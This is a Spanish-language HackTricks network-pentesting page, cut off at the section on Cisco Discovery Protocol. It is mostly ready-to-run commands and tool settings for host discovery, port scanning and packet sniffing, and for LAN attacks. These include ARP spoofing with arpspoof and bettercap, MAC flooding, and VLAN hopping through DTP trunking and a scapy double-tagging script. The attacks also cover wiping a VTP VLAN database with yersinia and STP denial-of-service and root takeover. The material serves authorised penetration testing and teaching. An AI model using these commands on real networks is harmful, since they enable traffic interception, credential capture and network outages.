# Pentesting de Red

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo de recompensa por errores**: ¬°**reg√≠strate** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**! ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Descubriendo hosts desde el exterior

Esta ser√° una **breve secci√≥n** sobre c√≥mo encontrar **IP que responden** desde **Internet**.\
En esta situaci√≥n, tienes alg√∫n **rango de IPs** (incluso varios **rangos**) y solo quieres encontrar **qu√© IPs est√°n respondiendo**.

### ICMP

Esta es la forma m√°s **f√°cil** y **r√°pida** de descubrir si un host est√° activo o no.\
Puedes intentar enviar algunos paquetes **ICMP** y **esperar respuestas**. La forma m√°s f√°cil es simplemente enviar una **solicitud de eco** y esperar la respuesta. Puedes hacerlo usando un simple `ping` o usando `fping` para **rangos**.\
Tambi√©n puedes usar **nmap** para enviar otros tipos de paquetes ICMP (esto evitar√° los filtros de las solicitudes y respuestas de eco ICMP comunes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descubrimiento de puertos TCP

Es muy com√∫n encontrar que todos los tipos de paquetes ICMP est√°n siendo filtrados. Entonces, todo lo que puedes hacer para verificar si un host est√° activo es **intentar encontrar puertos abiertos**. Cada host tiene **65535 puertos**, por lo que si tienes un alcance "grande" no puedes probar si **cada puerto** de cada host est√° abierto o no, eso tomar√≠a demasiado tiempo.\
Entonces, lo que necesitas es un **esc√°ner de puertos r√°pido** ([masscan](https://github.com/robertdavidgraham/masscan)) y una lista de los **puertos m√°s utilizados:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Tambi√©n puedes realizar este paso con `nmap`, pero es m√°s lento y `nmap` tiene problemas para identificar hosts activos.

### Descubrimiento de puertos HTTP

Esto es simplemente un descubrimiento de puertos TCP √∫til cuando quieres **centrarte en descubrir servicios HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descubrimiento de puertos UDP

Tambi√©n podr√≠as intentar verificar si hay alg√∫n **puerto UDP abierto** para decidir si debes **prestar m√°s atenci√≥n** a un **host**. Como los servicios UDP generalmente **no responden** con **ning√∫n dato** a un paquete de prueba UDP vac√≠o regular, es dif√≠cil decir si un puerto est√° siendo filtrado o abierto. La forma m√°s f√°cil de decidir esto es enviar un paquete relacionado con el servicio en ejecuci√≥n, y como no sabes qu√© servicio est√° en ejecuci√≥n, deber√≠as intentar el m√°s probable basado en el n√∫mero de puerto:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La l√≠nea de nmap propuesta anteriormente probar√° los **1000 puertos UDP principales** en cada host dentro del rango **/24**, pero incluso solo esto tomar√° **>20min**. Si necesitas **resultados m√°s r√°pidos**, puedes usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Esto enviar√° estas **sondas UDP** a su **puerto esperado** (para un rango /24 esto solo tomar√° 1 minuto): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descubrimiento de puertos SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqu√≠ puedes encontrar una gu√≠a completa de todos los ataques Wifi conocidos en el momento de la escritura:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Descubriendo hosts desde el interior

Si est√°s dentro de la red, una de las primeras cosas que querr√°s hacer es **descubrir otros hosts**. Dependiendo de **cu√°nto ruido** puedas o quieras hacer, se pueden realizar diferentes acciones:

### Pasivo

Puedes utilizar estas herramientas para descubrir hosts de forma pasiva dentro de una red conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Activo

Ten en cuenta que las t√©cnicas comentadas en [_**Descubriendo hosts desde el exterior**_](./#descubriendo-hosts-desde-el-exterior) (_Descubrimiento de puertos TCP/HTTP/UDP/SCTP_) tambi√©n se pueden **aplicar aqu√≠**.\
Pero, como est√°s en la **misma red** que los otros hosts, puedes hacer **m√°s cosas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Activo

Tenga en cuenta que las t√©cnicas comentadas en _Descubriendo hosts desde el exterior_ ([_**ICMP**_](./#icmp)) tambi√©n se pueden **aplicar aqu√≠**.\
Pero, como est√°s en la **misma red** que los otros hosts, puedes hacer **m√°s cosas**:

* Si haces **ping** a una **direcci√≥n de difusi√≥n de subred**, el ping deber√≠a llegar a **cada host** y ellos podr√≠an **responder** a **ti**: `ping -b 10.10.5.255`
* Al hacer ping a la **direcci√≥n de difusi√≥n de red**, incluso podr√≠as encontrar hosts dentro de **otras subredes**: `ping -b 255.255.255.255`
* Usa las banderas `-PE`, `-PP`, `-PM` de `nmap` para realizar el descubrimiento de hosts enviando respectivamente solicitudes de **eco ICMPv4**, **marca de tiempo** y **m√°scara de subred**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se utiliza para **encender** computadoras a trav√©s de un **mensaje de red**. El paquete m√°gico utilizado para encender la computadora es simplemente un paquete donde se proporciona una **MAC Dst** y luego se repite 16 veces dentro del mismo paquete.\
Estos paquetes suelen enviarse en un **ethernet 0x0842** o en un **paquete UDP al puerto 9**.\
Si no se proporciona una **\[MAC]**, el paquete se env√≠a a **broadcast ethernet** (y la MAC de difusi√≥n ser√° la que se repita).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneo de hosts

Una vez que hayas descubierto todas las IPs (externas o internas) que deseas escanear en profundidad, se pueden realizar diferentes acciones.

### TCP

* Puerto **abierto**: _SYN --> SYN/ACK --> RST_
* Puerto **cerrado**: _SYN --> RST/ACK_
* Puerto **filtrado**: _SYN --> \[SIN RESPUESTA]_
* Puerto **filtrado**: _SYN --> mensaje ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Existen 2 opciones para escanear un puerto UDP:

* Enviar un **paquete UDP** y verificar la respuesta _**ICMP unreachable**_ si el puerto est√° **cerrado** (en varios casos, ICMP estar√° **filtrado**, por lo que no recibir√°s ninguna informaci√≥n si el puerto est√° cerrado o abierto).
* Enviar **datagramas formateados** para obtener una respuesta de un **servicio** (por ejemplo, DNS, DHCP, TFTP y otros, como se indica en _nmap-payloads_). Si recibes una **respuesta**, entonces el puerto est√° **abierto**.

**Nmap** combinar√° ambas opciones usando "-sV" (los escaneos UDP son muy lentos), pero ten en cuenta que los escaneos UDP son m√°s lentos que los escaneos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Escaneo SCTP

SCTP se encuentra junto a TCP y UDP. Dise√±ado para proporcionar el transporte de datos de telefon√≠a a trav√©s de IP, el protocolo duplica muchas de las caracter√≠sticas de confiabilidad del Sistema de Se√±alizaci√≥n 7 (SS7) y respalda una familia de protocolos m√°s grande conocida como SIGTRAN. SCTP es compatible con sistemas operativos como IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS y VxWorks.

Nmap ofrece dos escaneos diferentes para SCTP: _-sY_ y _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasi√≥n de IDS y IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **M√°s opciones de nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revelaci√≥n de direcciones IP internas

A veces, los enrutadores, firewalls y dispositivos de red mal configurados **responden** a las sondas de red **utilizando direcciones de origen no p√∫blicas**. Puede utilizar _tcpdump_ para **identificar paquetes** recibidos de **direcciones privadas** durante las pruebas. En este caso, la interfaz _eth2_ en Kali Linux es **accesible** desde **Internet p√∫blico** (Si est√° **detr√°s** de un **NAT** o un **firewall**, es probable que este tipo de paquetes sean **filtrados**).
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

El sniffing te permite obtener detalles de rangos de IP, tama√±os de subred, direcciones MAC y nombres de host revisando los frames y paquetes capturados. Si la red est√° mal configurada o la infraestructura de conmutaci√≥n est√° bajo estr√©s, los atacantes pueden capturar material sensible a trav√©s del sniffing pasivo de la red.

Si una red Ethernet conmutada est√° configurada correctamente, solo ver√°s frames de difusi√≥n y material destinado a tu direcci√≥n MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Tambi√©n se puede capturar paquetes de una m√°quina remota a trav√©s de una sesi√≥n SSH con Wireshark como interfaz gr√°fica en tiempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap es una herramienta de hacking de red de c√≥digo abierto que se utiliza para realizar pruebas de penetraci√≥n en redes. Proporciona una amplia gama de funcionalidades para realizar ataques y pruebas de seguridad en redes locales y remotas.

#### Caracter√≠sticas principales

- **Sniffing de red**: Bettercap permite capturar y analizar el tr√°fico de red en tiempo real. Puede interceptar paquetes y extraer informaci√≥n sensible, como contrase√±as y cookies.

- **Ataques de suplantaci√≥n**: Con Bettercap, puedes realizar ataques de suplantaci√≥n de identidad, como ARP spoofing y DNS spoofing. Estos ataques te permiten redirigir el tr√°fico de red a trav√©s de tu m√°quina y realizar ataques de intermediario.

- **Inyecci√≥n de paquetes**: Bettercap te permite inyectar paquetes personalizados en la red. Esto puede ser √∫til para realizar ataques de denegaci√≥n de servicio (DoS) o para modificar el tr√°fico de red en tiempo real.

- **Interfaz web**: Bettercap proporciona una interfaz web f√°cil de usar que te permite controlar y configurar la herramienta de forma remota. Puedes ver estad√≠sticas en tiempo real, configurar ataques y visualizar resultados.

- **Modularidad**: Bettercap es altamente modular y extensible. Puedes escribir tus propios m√≥dulos para personalizar y ampliar las funcionalidades de la herramienta.

#### Uso b√°sico

Para utilizar Bettercap, primero debes instalarlo en tu m√°quina. Puedes encontrar instrucciones de instalaci√≥n detalladas en la documentaci√≥n oficial.

Una vez instalado, puedes ejecutar Bettercap desde la l√≠nea de comandos utilizando el siguiente comando:

```
bettercap
```

Esto iniciar√° la herramienta y mostrar√° la interfaz de l√≠nea de comandos de Bettercap. Desde aqu√≠, puedes utilizar los comandos y opciones disponibles para realizar diferentes tipos de ataques y pruebas de seguridad en la red.

Es importante tener en cuenta que el uso de Bettercap para realizar pruebas de penetraci√≥n en redes sin el consentimiento expl√≠cito del propietario de la red es ilegal y puede tener consecuencias legales graves. Siempre aseg√∫rate de obtener el permiso adecuado antes de utilizar esta herramienta.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciales

Puedes utilizar herramientas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analizar las credenciales de un archivo pcap o de una interfaz en vivo.

## Ataques en LAN

### ARP spoofing

El ARP Spoofing consiste en enviar respuestas ARP gratuitas para indicar que la IP de una m√°quina tiene la MAC de nuestro dispositivo. Luego, la v√≠ctima cambiar√° la tabla ARP y contactar√° a nuestra m√°quina cada vez que quiera comunicarse con la IP falsificada.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
El comando `arpspoof` se utiliza para realizar un ataque de envenenamiento de ARP en una red local. Este ataque permite redirigir el tr√°fico de red a trav√©s del atacante, lo que le permite interceptar y manipular los datos transmitidos entre dos hosts en la red. El comando `arpspoof` se encuentra en la suite de herramientas de `dsniff` y se puede utilizar en sistemas operativos basados en Unix. 

##### **Uso**

```
arpspoof -i <interface> -t <target> <gateway>
```

- `-i <interface>`: especifica la interfaz de red a utilizar.
- `-t <target>`: especifica la direcci√≥n IP de la v√≠ctima.
- `<gateway>`: especifica la direcci√≥n IP de la puerta de enlace predeterminada.

##### **Ejemplo**

```
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

Este comando redirigir√° el tr√°fico entre la v√≠ctima con direcci√≥n IP `192.168.1.100` y la puerta de enlace predeterminada con direcci√≥n IP `192.168.1.1` a trav√©s del atacante. Esto permitir√° al atacante interceptar y manipular el tr√°fico de red entre estos dos hosts.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Desbordamiento de CAM

Desborde la tabla CAM del switch enviando muchos paquetes con diferentes direcciones MAC de origen. Cuando la tabla CAM est√© llena, el switch comenzar√° a comportarse como un concentrador (transmitiendo todo el tr√°fico).
```bash
macof -i <interface>
```
En los switches modernos, esta vulnerabilidad ha sido corregida.

### Ataques a VLAN / DTP 802.1Q

#### Troncalizaci√≥n Din√°mica

**DTP (Protocolo de Troncalizaci√≥n Din√°mica)** es un protocolo de capa de enlace dise√±ado para proporcionar un sistema autom√°tico de troncalizaci√≥n. Con DTP, los switches deciden qu√© puerto funcionar√° en modo troncal (Trunk) y cu√°l no. El uso de **DTP** indica una **mala configuraci√≥n de red**. Las troncales deben estar estrictamente donde se necesiten y debe estar documentado.

**De forma predeterminada, todos los puertos del switch operan en modo Auto Din√°mico.** Esto indica que el puerto del switch est√° en modo de inicio de troncal desde el switch vecino. **El Pentester necesita conectarse f√≠sicamente al switch y enviar un marco DTP Desirable**, lo que provoca que el puerto cambie al modo troncal. El atacante puede entonces enumerar las VLAN utilizando el an√°lisis de marcos STP y evitar la segmentaci√≥n de VLAN mediante la creaci√≥n de interfaces virtuales.

Muchos switches admiten el Protocolo de Troncalizaci√≥n Din√°mica (DTP) de forma predeterminada, lo cual un adversario puede aprovechar para **emular un switch y recibir tr√°fico en todas las VLAN**. La herramienta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) puede capturar un interfaz y **reportar si el switch est√° en modo predeterminado, troncal, din√°mico, autom√°tico o de acceso** (este √∫ltimo evitar√≠a el salto de VLAN). La herramienta indicar√° si el switch es vulnerable o no.

Si se descubre que la red es vulnerable, puedes usar _**Yersinia**_ para lanzar un "**enable trunking**" utilizando el protocolo "**DTP**" y podr√°s ver los paquetes de red de todas las VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Para enumerar las VLANs tambi√©n es posible generar el marco DTP Desirable con el script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. No interrumpas el script bajo ninguna circunstancia. Inyecta DTP Desirable cada tres segundos. **Los canales de trunk creados din√°micamente en el switch solo duran cinco minutos. Despu√©s de cinco minutos, el trunk se desconecta.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Me gustar√≠a se√±alar que **Access/Desirable (0x03)** indica que el marco DTP es del tipo Deseable, lo cual indica al puerto que cambie a modo Trunk. Y **802.1Q/802.1Q (0xa5)** indica el tipo de encapsulaci√≥n **802.1Q**.

Al analizar los marcos STP, **aprendemos sobre la existencia de la VLAN 30 y la VLAN 60**.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs espec√≠ficas

Una vez que conozcas los valores de ID de VLAN e IP, puedes **configurar una interfaz virtual para atacar una VLAN espec√≠fica**.\
Si DHCP no est√° disponible, entonces usa _ifconfig_ para configurar una direcci√≥n IP est√°tica.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saltador autom√°tico de VLAN

El ataque discutido de **Troncal Din√°mica y creaci√≥n de interfaces virtuales y descubrimiento de hosts dentro** de otras VLAN se **realiza autom√°ticamente** con la herramienta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Doble etiquetado

Si un atacante conoce el valor de la **MAC, IP y ID de VLAN del host v√≠ctima**, podr√≠a intentar **etiquetar dos veces un marco** con su VLAN designada y la VLAN de la v√≠ctima y enviar un paquete. Como la **v√≠ctima no podr√° conectarse de vuelta** con el atacante, la **mejor opci√≥n para el atacante es comunicarse a trav√©s de UDP** con protocolos que puedan realizar algunas acciones interesantes (como SNMP).

Otra opci√≥n para el atacante es lanzar un **escaneo de puertos TCP falsificando una IP controlada por el atacante y accesible por la v√≠ctima** (probablemente a trav√©s de internet). Luego, el atacante podr√≠a espiar en el segundo host que le pertenece si recibe algunos paquetes de la v√≠ctima.

![](<../../.gitbook/assets/image (635) (1).png>)

Para realizar este ataque, puedes usar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentaci√≥n Lateral de VLAN <a href="#d679" id="d679"></a>

Si tienes **acceso a un switch al que est√°s conectado directamente**, tienes la capacidad de **bypassear la segmentaci√≥n de VLAN** dentro de la red. Simplemente **cambia el puerto al modo trunk** (tambi√©n conocido como trunk), crea interfaces virtuales con las IDs de las VLANs objetivo y configura una direcci√≥n IP. Puedes intentar solicitar la direcci√≥n de forma din√°mica (DHCP) o puedes configurarla est√°ticamente. Depende del caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypass de VLAN Privada de Capa 3

En redes inal√°mbricas para invitados y otros entornos, se utilizan configuraciones de VLAN privada (tambi√©n conocida como _aislamiento de puertos_) para **evitar que los pares interact√∫en** (es decir, los clientes **se conectan a un punto de acceso inal√°mbrico pero no pueden comunicarse entre s√≠**). Dependiendo de las ACLs de red (o la falta de ellas), podr√≠a ser posible enviar paquetes IP a un enrutador, que luego los reenv√≠a a un par vecino.

Este ataque enviar√° un **paquete especialmente dise√±ado a la IP de un cliente pero con la MAC del enrutador**. Luego, el **enrutador redirigir√° el paquete al cliente**. Al igual que en los _Ataques de Etiquetado Doble_, puedes aprovechar esta vulnerabilidad controlando un host accesible por la v√≠ctima.

### Ataques a VTP

**VTP (Protocolo de Troncalizaci√≥n de VLAN)** es un protocolo dise√±ado para gestionar centralmente las VLANs. Para llevar un seguimiento de la base de datos de VLAN actual, los switches verifican n√∫meros de revisi√≥n especiales. Cuando ocurre alguna actualizaci√≥n de la tabla, el n√∫mero de revisi√≥n se incrementa en uno. Y si un switch detecta una configuraci√≥n con un n√∫mero de revisi√≥n m√°s alto, actualizar√° autom√°ticamente su base de datos de VLAN.

#### Roles en un dominio VTP <a href="#ebfc" id="ebfc"></a>

* **VTP Server.** Un switch en el rol de VTP Server puede crear nuevas VLANs, eliminar las antiguas o cambiar informaci√≥n en las propias VLANs. **Tambi√©n genera anuncios VTP para el resto de los miembros del dominio.**
* **VTP Client.** Un switch en este rol recibir√° anuncios VTP espec√≠ficos de otros switches en el dominio para actualizar las bases de datos de VLAN propias. Los clientes tienen limitaciones en su capacidad para crear VLANs e incluso no se les permite cambiar la configuraci√≥n de VLAN localmente. En otras palabras, **acceso de solo lectura.**
* **VTP Transparent.** En este modo, el switch no participa en los procesos de VTP y puede administrar completamente y localmente toda la configuraci√≥n de VLAN. Cuando opera en modo transparente, los switches solo transmiten anuncios VTP de otros switches sin afectar su configuraci√≥n de VLAN. **Estos switches siempre tendr√°n un n√∫mero de revisi√≥n de cero y no pueden ser atacados.**

#### Tipos de anuncios <a href="#b384" id="b384"></a>

* **Anuncio Resumen ‚Äî** el anuncio VTP que el VTP server env√≠a cada **300 segundos (5 minutos).** Este anuncio almacena el nombre del dominio VTP, la versi√≥n del protocolo, la marca de tiempo y el valor hash de configuraci√≥n MD5.
* **Anuncio de Subconjunto ‚Äî** este es el anuncio VTP que se env√≠a cada vez que ocurre un cambio en la configuraci√≥n de VLAN.
* **Solicitud de Anuncio ‚Äî** es una solicitud del cliente VTP al servidor VTP para obtener un mensaje de Anuncio Resumen. Por lo general, se env√≠a en respuesta a un mensaje que indica que un switch ha detectado un Anuncio Resumen con un n√∫mero de revisi√≥n de configuraci√≥n m√°s alto.

VTP solo puede ser atacado desde un puerto trunk, porque los anuncios VTP solo se transmiten y reciben en puertos trunk. Por lo tanto, cuando hagas pentesting despu√©s de atacar DTP, tu pr√≥ximo objetivo podr√≠a ser VTP. Para atacar el dominio VTP, puedes usar Yersinia para ejecutar una inyecci√≥n VTP que borrar√° toda la base de datos de VLAN y, por lo tanto, paralizar√° la red.

{% hint style="info" %}
El protocolo VTP tiene hasta **tres versiones**. En esta publicaci√≥n, el ataque se dirige a la primera versi√≥n, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Para borrar toda la base de datos de VLAN, selecciona la opci√≥n **eliminar todas las VLAN de VTP**.

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Ataques STP

**Si no puedes capturar tramas BPDU en tus interfaces, es poco probable que tengas √©xito en un ataque STP.**

#### **DoS de BPDU STP**

Al enviar muchas BPDUs TCP (Notificaci√≥n de Cambio de Topolog√≠a) o Conf (las BPDUs que se env√≠an cuando se crea la topolog√≠a), los switches se sobrecargan y dejan de funcionar correctamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque STP TCP**

Cuando se env√≠a un TCP, la tabla CAM de los switches se eliminar√° en 15 segundos. Entonces, si env√≠as continuamente este tipo de paquetes, la tabla CAM se reiniciar√° continuamente (o cada 15 segundos) y cuando se reinicie, el switch se comportar√° como un concentrador.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque de STP Root**

El atacante simula el comportamiento de un switch para convertirse en la ra√≠z STP de la red. Luego, m√°s datos pasar√°n a trav√©s de √©l. Esto es interesante cuando est√°s conectado a dos switches diferentes.\
Esto se logra enviando paquetes CONF de BPDUs que indican que el valor de **prioridad** es menor que la prioridad real del switch ra√≠z actual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si el atacante est√° conectado a 2 switches, puede convertirse en la ra√≠z del nuevo √°rbol y todo el tr√°fico entre esos switches pasar√° a trav√©s de √©l** (se realizar√° un ataque MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

El Protocolo de Descubrimiento CISCO (CDP) es el protocolo utilizado por los dispositivos CISCO para comunicarse entre s√≠, **descubrir qui√©n est√° activo** y qu√© caracter√≠sticas tienen.

#### Recopilaci√≥n de informaci√≥n <a href="#0e0f" id="0e0f"></a>

